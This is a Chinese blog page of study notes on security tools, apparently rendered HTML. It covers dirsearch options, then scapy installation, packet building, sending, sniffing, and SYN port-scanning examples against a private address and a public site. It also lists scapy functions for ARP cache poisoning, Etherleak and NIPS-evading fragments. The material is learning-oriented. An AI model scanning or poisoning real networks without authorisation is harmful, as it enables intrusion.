constant_">REGEXPS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by redirect regexps or texts,</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       separated by commas (<span class="hljs-title class_">Example</span>: <span class="hljs-string">&#x27;https://okta.com/*&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-content=<span class="hljs-variable constant_">PATH</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by response content <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span> path</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --skip-on-status=<span class="hljs-variable constant_">CODES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Skip</span> target whenever hit one <span class="hljs-keyword">of</span> these status codes,</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       separated by commas, support ranges</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --minimal=<span class="hljs-variable constant_">LENGTH</span>    <span class="hljs-title class_">Minimal</span> response length</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --maximal=<span class="hljs-variable constant_">LENGTH</span>    <span class="hljs-title class_">Maximal</span> response length</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --max-time=<span class="hljs-variable constant_">SECONDS</span>  <span class="hljs-title class_">Maximal</span> runtime <span class="hljs-keyword">for</span> the scan</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -q, --quiet-mode    <span class="hljs-title class_">Quiet</span> mode</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --full-url          <span class="hljs-title class_">Full</span> <span class="hljs-title class_">URLs</span> <span class="hljs-keyword">in</span> the output (enabled automatically <span class="hljs-keyword">in</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       quiet mode)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --no-color          <span class="hljs-title class_">No</span> colored output</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> <span class="hljs-title class_">Request</span> <span class="hljs-title class_">Settings</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -m <span class="hljs-variable constant_">METHOD</span>, --http-method=<span class="hljs-variable constant_">METHOD</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-variable constant_">HTTP</span> method (<span class="hljs-attr">default</span>: <span class="hljs-variable constant_">GET</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -d <span class="hljs-variable constant_">DATA</span>, --data=<span class="hljs-variable constant_">DATA</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-variable constant_">HTTP</span> request data</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -H <span class="hljs-variable constant_">HEADERS</span>, --header=<span class="hljs-variable constant_">HEADERS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-variable constant_">HTTP</span> request header, support multiple flags (<span class="hljs-title class_">Example</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       -H <span class="hljs-string">&#x27;Referer: example.com&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --header-list=<span class="hljs-variable constant_">FILE</span>  <span class="hljs-title class_">File</span> contains <span class="hljs-variable constant_">HTTP</span> request headers</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -F, --follow-redirects</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Follow</span> <span class="hljs-variable constant_">HTTP</span> redirects</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --random-agent      <span class="hljs-title class_">Choose</span> a random <span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span> <span class="hljs-keyword">for</span> each request</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --auth-type=<span class="hljs-variable constant_">TYPE</span>    <span class="hljs-title class_">Authentication</span> type (basic, digest, bearer, ntlm)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --auth=<span class="hljs-variable constant_">CREDENTIAL</span>   <span class="hljs-title class_">Authentication</span> credential (<span class="hljs-attr">user</span>:password or bearer</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       token)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --user-agent=<span class="hljs-variable constant_">USERAGENT</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --cookie=<span class="hljs-variable constant_">COOKIE</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> <span class="hljs-title class_">Connection</span> <span class="hljs-title class_">Settings</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --timeout=<span class="hljs-variable constant_">TIMEOUT</span>   <span class="hljs-title class_">Connection</span> timeout</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -s <span class="hljs-variable constant_">DELAY</span>, --delay=<span class="hljs-variable constant_">DELAY</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Delay</span> between requests</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --proxy=<span class="hljs-variable constant_">PROXY</span>       <span class="hljs-title class_">Proxy</span> <span class="hljs-variable constant_">URL</span>, support <span class="hljs-variable constant_">HTTP</span> and <span class="hljs-variable constant_">SOCKS</span> proxies (<span class="hljs-title class_">Example</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-attr">localhost</span>:<span class="hljs-number">8080</span>, <span class="hljs-attr">socks5</span>:<span class="hljs-comment">//localhost:8088)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --proxy-list=<span class="hljs-variable constant_">FILE</span>   <span class="hljs-title class_">File</span> contains proxy servers</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --replay-proxy=<span class="hljs-variable constant_">PROXY</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Proxy</span> to replay <span class="hljs-keyword">with</span> found paths</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --scheme=<span class="hljs-variable constant_">SCHEME</span>     <span class="hljs-title class_">Default</span> scheme (<span class="hljs-keyword">for</span> raw request or <span class="hljs-keyword">if</span> there is no</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       scheme <span class="hljs-keyword">in</span> the <span class="hljs-variable constant_">URL</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --max-rate=<span class="hljs-variable constant_">RATE</span>     <span class="hljs-title class_">Max</span> requests per second</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --retries=<span class="hljs-variable constant_">RETRIES</span>   <span class="hljs-title class_">Number</span> <span class="hljs-keyword">of</span> retries <span class="hljs-keyword">for</span> failed requests</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -b, --request-by-hostname</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">By</span> <span class="hljs-keyword">default</span> dirsearch requests by <span class="hljs-variable constant_">IP</span> <span class="hljs-keyword">for</span> speed. <span class="hljs-title class_">This</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       will force dirsearch to request by hostname</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --ip=<span class="hljs-variable constant_">IP</span>             <span class="hljs-title class_">Server</span> <span class="hljs-variable constant_">IP</span> address</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exit-on-error     <span class="hljs-title class_">Exit</span> whenever an error occurs</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> <span class="hljs-title class_">Reports</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -o <span class="hljs-variable constant_">FILE</span>, --output=<span class="hljs-variable constant_">FILE</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Output</span> file</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --format=<span class="hljs-variable constant_">FORMAT</span>     <span class="hljs-title class_">Report</span> format (<span class="hljs-title class_">Available</span>: simple, plain, json, xml,md, csv, html)</span><br><br><br><br>## scapy---这东西真好玩<br><br>下面是官方源码地址:<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/secdev/scapy/blob/master/scapy/sessions.py</span></span><br><br><br><br>### 准备环境<br><br>![image-20220129180955360](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-1.png)<br><br><br><br>官方目前给出python对应的scapy版本  目前时间为:`2022-1-29`<br><br><br><br>首先下载安装<br><br>`pip install scapy`，然后在命令行中输入scapy即可运行交互的scapy<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">如果显示没有找到包则证明环境变量不对,我以win10为例子来说明一下</span><br><br>![image-20220129175922805](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-2.png)<br><br>必须包含你python的Scripts在环境变量中<br><br>kali也是直接安装(kali是ubuntu那一支的)`pip install scapy`,然后还需要:<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">apt-get install tcpdump</span><br><br><br><br>然后我们还有几个可能用到的依赖<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">pip install matplotlib	 <span class="hljs-comment">//作图</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">pip install pyx				<span class="hljs-comment">//二维</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">但是如果要使用pyx需要安装 [texlive (<span class="hljs-title class_">Unix</span>)](<span class="hljs-attr">http</span>:<span class="hljs-comment">//www.tug.org/texlive/) 或 [MikTex (Windows)](https://miktex.org/) </span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">kali安装texlive方法<span class="hljs-string">`apt-get install texlive`</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">pip install vpython		<span class="hljs-comment">//三维</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">pip install cryptography <span class="hljs-comment">//WEP解密</span></span><br><br><br><br><br><br>### 文档地址<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">中文文档</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-attr">https</span>:<span class="hljs-comment">//www.osgeo.cn/scapy/usage.html</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">英文文档</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-attr">https</span>:<span class="hljs-comment">//scapy.readthedocs.io/en/latest/usage.html</span></span><br><br>建议这俩组合起来看,否则你就会遇见下面这种翻译,这tm不是机翻我真不信<br><br>![img](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-3.png)<br><br><br><br>![111](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-4.png)<br><br><br><br>(不要问我为啥不直接看英文的)<br><br><br><br>### 开始使用!!<br><br>运行交互环境<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">scapy   </span><br><br><br><br>#### 自定义主题<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">conf.<span class="hljs-property">color_theme</span> = <span class="hljs-title class_">BrightTheme</span>()</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">下面是常用主题</span><br><span class="hljs-meta prompt_">&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>DefaultTheme, BrightTheme, RastaTheme, ColorOnBlackTheme, BlackAndWhite, HTMLTheme, LatexTheme</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><br><br><span class="hljs-comment">#### 构建IP包</span><br><br>&gt;a=IP()<br><br>&gt;设置属性<br><br>&gt;a.dst=<span class="hljs-string">&quot;192.168.1.1&quot;</span><br><br>&gt;删除属性<br><br>&gt;del(a.dst)<br><br><br><br>合成包运算符(就算再python中也是这么用,我是没想到)<br><br>`IP()`<br>&lt;IP |&gt;<br>`P()/TCP()`<br>&lt;IP frag=<span class="hljs-number">0</span> proto=TCP |&lt;TCP |&gt;&gt;<br><br>`Ether()<span class="hljs-regexp">/IP()/</span>TCP()`<br><br>&lt;Ether  type=IPv4 |&lt;IP  frag=<span class="hljs-number">0</span> proto=tcp |&lt;TCP  |&gt;&gt;&gt;<br><br>`IP()<span class="hljs-regexp">/TCP()/</span><span class="hljs-string">&quot;GET / HTTP 1.1 \n\n&quot;</span>`<br><br>&lt;IP  frag=<span class="hljs-number">0</span> proto=tcp |&lt;TCP  |&lt;Raw  load=<span class="hljs-string">&#x27;GET / HTTP 1.1 \n\n&#x27;</span> |&gt;&gt;&gt;<br><br><br><br><span class="hljs-comment">#### 构造包和分解包</span><br><br>`raw(IP())`<br><br><span class="hljs-string">b&#x27;E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01&#x27;</span><br><br>`IP(_)`<br><br>&lt;IP  version=<span class="hljs-number">4</span> ihl=<span class="hljs-number">5</span> tos=<span class="hljs-number">0</span>x0 len=<span class="hljs-number">20</span> id=<span class="hljs-number">1</span> flags= frag=<span class="hljs-number">0</span> ttl=<span class="hljs-number">64</span> proto=hopopt chksum=<span class="hljs-number">0</span>x7ce7 src=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> dst=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> |&gt;<br><br>![image-<span class="hljs-number">20220129185254036</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/wodiu188/</span>Images<span class="hljs-regexp">/main/</span>blog_images/scapy-<span class="hljs-number">5</span>.png)<br><br>![image-<span class="hljs-number">20220129185355181</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/wodiu188/</span>Images<span class="hljs-regexp">/main/</span>blog_images/scapy-<span class="hljs-number">6</span>.png)<br><br>上面的e是使用函数对其进行补充后的包如果嫌他太臃肿可以使用`hide_defaults()来进行隐藏`<br><br>![image-<span class="hljs-number">20220129185707137</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/wodiu188/</span>Images<span class="hljs-regexp">/main/</span>blog_images/scapy-<span class="hljs-number">7</span>.png)<br><br><br><br><span class="hljs-comment">#### 从PCAP中读取</span><br><br>```python<br>a=rdpcap(<span class="hljs-string">&quot;/spare/captures/isakmp.cap&quot;</span>)<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="将数据存为PDF或者PS"><a href="#将数据存为PDF或者PS" class="headerlink" title="将数据存为PDF或者PS"></a>将数据存为PDF或者PS</h4><table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>raw(pkt)</td>
+<td>源数据</td>
+</tr>
+<tr>
+<td>hexdump(pkt)</td>
+<td>&#x3D;&#x3D;16进制源数据&#x3D;&#x3D;</td>
+</tr>
+<tr>
+<td>ls(pkt)</td>
+<td>&#x3D;&#x3D;包列表,详细列出所有的包,的全名和属性&#x3D;&#x3D;</td>
+</tr>
+<tr>
+<td>pkt.summary()</td>
+<td>&#x3D;&#x3D;一条概括&#x3D;&#x3D;</td>
+</tr>
+<tr>
+<td>pkt.show()</td>
+<td>&#x3D;&#x3D;树状展示数据&#x3D;&#x3D;</td>
+</tr>
+<tr>
+<td>pkt.show2()</td>
+<td>没看出来和上面的有啥区别</td>
+</tr>
+<tr>
+<td>pkt.sprintf()</td>
+<td>没试出来有啥用</td>
+</tr>
+<tr>
+<td>pkt.decode_payload_as()</td>
+<td>changes the way the payload is decoded</td>
+</tr>
+<tr>
+<td>pkt.psdump()</td>
+<td>用解释的解剖绘制PostScript图表</td>
+</tr>
+<tr>
+<td>pkt.pdfdump()</td>
+<td>用解释的解剖绘制PDF</td>
+</tr>
+<tr>
+<td>pkt.command()</td>
+<td>返回可生成数据包的scapy命令</td>
+</tr>
+</tbody></table>
+<h4 id="https-scapy-readthedocs-io-en-latest-usage-html-generating-sets-of-packets"><a href="#https-scapy-readthedocs-io-en-latest-usage-html-generating-sets-of-packets" class="headerlink" title="https://scapy.readthedocs.io/en/latest/usage.html#generating-sets-of-packets"></a><a target="_blank" rel="noopener" href="https://scapy.readthedocs.io/en/latest/usage.html#generating-sets-of-packets">https://scapy.readthedocs.io/en/latest/usage.html#generating-sets-of-packets</a></h4><p>这一部分没看懂,好像是你生成了一个数据包的集合然后你要怎么从一个来获取全部??</p>
+<h4 id="发送数据包"><a href="#发送数据包" class="headerlink" title="发送数据包"></a>发送数据包</h4><p>主要有两个函数</p>
+<p>send()用于发送第三层的数据包,无响应接收</p>
+<p>sendp()用于发送第二层的数据包,无响应接收</p>
+<p>sr1()用于发送三层的数据包,有响应接收</p>
+<p>srp()用于二层的数据包,有响应接收</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-8.png" srcset="/img/loading.gif" lazyload alt="image-20220130110015724"></p>
+<blockquote>
+<p>可以设置两个数据包之间的等待间隔使用inter参数(秒为单位)</p>
+<p>如果某些包超时了,或者丢失了可以重传,使用retry参数来设置,如果retry&#x3D;3则尝试重新发送三次未响应的数据包,如果retry&#x3D;-3则重新发送未响应的数据包,并直到连续三次为止</p>
+<p>timeout用来指定最后一个数据包的等待时间</p>
+<p>下面是例子:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sr</span>(IP(dst=<span class="hljs-string">&quot;172.20.29.5/30&quot;</span>)/TCP(dport=[<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>]),inter=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,retry=-<span class="hljs-number">2</span>,timeout=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="默认值修改函数"><a href="#默认值修改函数" class="headerlink" title="默认值修改函数"></a>默认值修改函数</h4><p>fuzz()</p>
+<p>修改后的数值是随机的,操作如下</p>
+<blockquote>
+<p>send(IP(dst&#x3D;”target”)&#x2F;fuzz(UDP()&#x2F;NTP(version&#x3D;4)),loop&#x3D;1)</p>
+</blockquote>
+<h4 id="注入字节"><a href="#注入字节" class="headerlink" title="注入字节"></a>注入字节</h4><p>在数据包中,所有的字段都有特定的类型,如果你想要注入不同的类型可以使用RawVal</p>
+<blockquote>
+<p>pkt &#x3D; IP(len&#x3D;RawVal(b”NotAnInteger”), src&#x3D;”127.0.0.1”)</p>
+</blockquote>
+<h4 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h4><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-9.png" srcset="/img/loading.gif" lazyload alt="image-20220130111816301"></p>
+<p>向百度发出请求,并且接收响应后退出,可以看出flags&#x3D;SA表示该端口为开放端口</p>
+<p>检测多个端口</p>
+<blockquote>
+<p>sr(IP(dst&#x3D;”192.168.1.1”)&#x2F;TCP(sport&#x3D;666,dport&#x3D;(440,443),flags&#x3D;”S”))</p>
+<p>从440到443端口</p>
+</blockquote>
+<blockquote>
+<p>sr(IP(dst&#x3D;”192.168.1.1”)&#x2F;TCP(sport&#x3D;RandShort(),dport&#x3D;[440,441,442,443],flags&#x3D;”S”))</p>
+<p>这样可以写成一个数组然后进行探测</p>
+</blockquote>
+<p>如果没有设置变量可以是使用_来获取探测结果</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">ans</span>, unans = _<br>&gt;&gt;&gt; <span class="hljs-built_in">ans</span>.summary()<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ans.summary( lambda s,r: r.sprintf(“%TCP.sport% \t %TCP.flags%”) )</p>
+</blockquote>
+<p>还可以和上面这种进行格式化输出</p>
+<p>&#x3D;&#x3D;make_table部分没看懂&#x3D;&#x3D;</p>
+<p>过滤flags只为SA</p>
+<p>nsummary和summary的区别</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-10.png" srcset="/img/loading.gif" lazyload alt="image-20220203190633834"></p>
+<blockquote>
+<p>ans.nsummary(lfilter &#x3D; lambda s,r: r.sprintf(“%TCP.flags%”) &#x3D;&#x3D; “SA”)</p>
+</blockquote>
+<p>对端口进行专门分析,并得出哪些是开放的</p>
+<blockquote>
+<p>ans.summary(lfilter &#x3D; lambda s,r: r.sprintf(“%TCP.flags%”) &#x3D;&#x3D; “SA”,prn&#x3D;lambda s,r: r.sprintf(“%TCP.sport% is open”))</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311941997.png" srcset="/img/loading.gif" lazyload alt="image-20220130113405578"></p>
+<p>懒得写了,也没法做测试,毕竟上个一测试我还没做完了</p>
+<h4 id="lsc-可查看大部分的函数"><a href="#lsc-可查看大部分的函数" class="headerlink" title="lsc()可查看大部分的函数"></a>lsc()可查看大部分的函数</h4><blockquote>
+<p>PID_count          : Identify IP id values classes in a list of packets<br>arpcachepoison      : Poison target’s cache with (your MAC,victim’s IP) couple<br>arping              : Send ARP who-has requests to determine which hosts are up<br>arpleak             : Exploit ARP leak flaws, like NetBSD-SA2017-002.<br>bind_layers         : Bind 2 layers on some specific fields’ values.<br>bridge_and_sniff    : Forward traffic between interfaces if1 and if2, sniff and return<br>chexdump            : Build a per byte hexadecimal representation<br>computeNIGroupAddr  : Compute the NI group Address. Can take a FQDN as input parameter<br>corrupt_bits        :<br>corrupt_bytes       :<br>defrag              : defrag(plist) -&gt; ([not fragmented], [defragmented],<br>defragment          : defragment(plist) -&gt; plist defragmented as much as possible<br>dhcp_request        : Send a DHCP discover request and return the answer<br>dyndns_add          : Send a DNS add message to a nameserver for “name” to have a new “rdata”<br>dyndns_del          : Send a DNS delete message to a nameserver for “name”<br>etherleak           : Exploit Etherleak flaw<br>explore             : Function used to discover the Scapy layers and protocols.<br>fletcher16_checkbytes: Calculates the Fletcher-16 checkbytes returned as 2 byte binary-string.<br>fletcher16_checksum : Calculates Fletcher-16 checksum of the given buffer.<br>fragleak            : –<br>fragleak2           : –<br>fragment            : Fragment a big IP datagram<br>fuzz                :<br>getmacbyip          : Return MAC address corresponding to a given IP address<br>getmacbyip6         : Returns the MAC address corresponding to an IPv6 address<br>hexdiff             : Show differences between 2 binary strings<br>hexdump             : Build a tcpdump like hexadecimal view<br>hexedit             : Run hexedit on a list of packets, then return the edited packets.<br>hexstr              : Build a fancy tcpdump like hex from bytes.<br>import_hexcap       : Imports a tcpdump like hexadecimal view<br>is_promisc          : Try to guess if target is in Promisc mode. The target is provided by its ip.<br>linehexdump         : Build an equivalent view of hexdump() on a single line<br>ls                  : List  available layers, or infos on a given layer class or name.<br>neighsol            : Sends and receive an ICMPv6 Neighbor Solicitation message<br>overlap_frag        : Build overlapping fragments to bypass NIPS<br>promiscping         : Send ARP who-has requests to determine which hosts are in promiscuous mode<br>rdpcap              : Read a pcap or pcapng file and return a packet list<br>report_ports        : portscan a target and output a LaTeX table<br>restart             : Restarts scapy<br>rfc                 :<br>send                :<br>sendp               :<br>sendpfast           : Send packets at layer 2 using tcpreplay for performance<br>sniff               :<br>split_layers        : Split 2 layers previously bound.<br>sr                  :<br>sr1                 :<br>sr1flood            : Flood and receive packets at layer 3 and return only the first answer<br>srbt                : send and receive using a bluetooth socket<br>srbt1               : send and receive 1 packet using a bluetooth socket<br>srflood             : Flood and receive packets at layer 3<br>srloop              : Send a packet at layer 3 in loop and print the answer each time<br>srp                 :<br>srp1                :<br>srp1flood           : Flood and receive packets at layer 2 and return only the first answer<br>srpflood            : Flood and receive packets at layer 2<br>srploop             : Send a packet at layer 2 in loop and print the answer each time<br>tcpdump             : Run tcpdump or tshark on a list of packets.<br>tdecode             :<br>traceroute          : Instant TCP traceroute<br>traceroute6         : Instant TCP traceroute using IPv6<br>traceroute_map      : Util function to call traceroute on multiple targets, then<br>tshark              : Sniff packets and print them calling pkt.summary().<br>wireshark           :<br>wrpcap              : Write a list of packets to a pcap file</p>
+</blockquote>
+<h4 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h4><p>套接字简单的理解是网络中两个应用之间的通信格式是ip：端口</p>
+<p>默认情况使用本地套接字，如果要使用手动的数据包捕获库函数就要安装下面的东西：</p>
+<ul>
+<li>在UNIX&#x2F;OSX上：确保安装了libpcap。</li>
+<li>在Windows上：安装npcap&#x2F;winpcap。（默认）</li>
+</ul>
+<p>然后</p>
+<p>conf.use_pcap&#x3D;true</p>
+<p>这时会自动使用</p>
+<p>conf.L2socket和conf.L3socket</p>
+<p>如果想要使用自定义的可以如下设置</p>
+<blockquote>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&gt;conf.<span class="hljs-attribute">L3socket</span>=L3pcapSocket  # Receive/send L3 packets through libpcap<br>&gt;conf.<span class="hljs-attribute">L2listen</span>=L2ListenTcpdump  # Receive L2 packets through TCPDump<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h4><p>监听指定的包如下：</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/scapy-12.png" srcset="/img/loading.gif" lazyload alt="image-20220203190331356"></p>
+<p>然后可以使用</p>
+<blockquote>
+<p>a&#x3D;_</p>
+<p>a[1]</p>
+<p>a.nsummary()</p>
+<p>来查看详细数据</p>
+</blockquote>
+<p>sniff函数解析如下:</p>
+<ul>
+<li><p>filter:使用过滤规则</p>
+<ul>
+<li><blockquote>
+<p>sniff(filter&#x3D;”icmp and host 66.35.250.151”)</p>
+<p>只保留icmp包和地址是66.35.250.151的数据包</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>session:监听包的类型</p>
+<ul>
+<li>IPSession:获取所有的IP包</li>
+<li>TCPSession:获取所有的TCP包</li>
+<li>TLSSession:匹配TLS会话&#x2F;&#x2F;这个好像不存在了</li>
+</ul>
+</li>
+<li><p>iface:指定监听网卡号</p>
+<ul>
+<li><blockquote>
+<p>sniff(iface&#x3D;”eth1”)</p>
+<p>只保留eth1网卡的数据包</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>prn:结果显示方式</p>
+<ul>
+<li><blockquote>
+<p>prn&#x3D;lambda x: x.show()</p>
+<p>使用lambda来对数据用show来显示</p>
+<p>sniff(iface&#x3D;[“eth1”,”eth2”], prn&#x3D;lambda x: x.sniffed_on+”: “+x.summary())</p>
+<p>x.sniffed_on代表根据,如下的eth0</p>
